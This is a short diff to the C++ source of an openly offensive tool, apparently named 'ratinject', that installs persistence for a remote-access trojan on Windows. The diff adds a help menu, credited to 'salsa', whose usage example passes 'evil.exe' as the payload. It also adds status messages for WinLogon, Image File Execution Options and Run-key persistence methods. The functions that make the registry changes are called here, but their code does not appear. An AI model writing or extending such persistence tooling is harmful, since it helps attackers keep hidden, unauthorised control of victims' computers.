@@ -70,6 +70,9 @@ int close(const char* exe) {
 
 int main (int argc, char** argv){
     exe = argv[1];
+    if (argc <= 2) {
+      cout<<"\n\tHelp Menu\n\tcreated by salsa\n\n\tOptions:\n\t1- Run\n\t2- Open\n\t3- Close\n\t4- WinLogon\n\t5- All\n\n\tUsage:\n\tratinject.exe evil.exe persistence-options\n\n\tRecommended Example:\n\tratinject.exe evil.exe Open Run Close\n";
+    }
     for (int i = 1; i < argc; ++i) {
         if (argv[i] == string("All")) {
             runkeys(exe);
@@ -78,15 +81,19 @@ int main (int argc, char** argv){
             winlogon(exe);
         }
         else if (argv[i] == string("Winlogon") || argv[i] == string("winlogon")) {
+            cout<<"Executing WinLogon Persistence...";
             winlogon(exe);
         }
         else if (argv[i] == string("Open") || argv[i] == string("open")) {
+            cout<<"Executing Image Options Persistence...";
             open(exe);
         }
         else if (argv[i] == string("Close") || argv[i] == string("close")) {
+            cout<<"Executing Image Options Persistence...";
             close(exe);
         }
         else if (argv[i] == string("Run") || argv[i] == string("run")) {
+            cout<<"Executing Runkeys Persistence...";
             runkeys(exe);
         }
     }
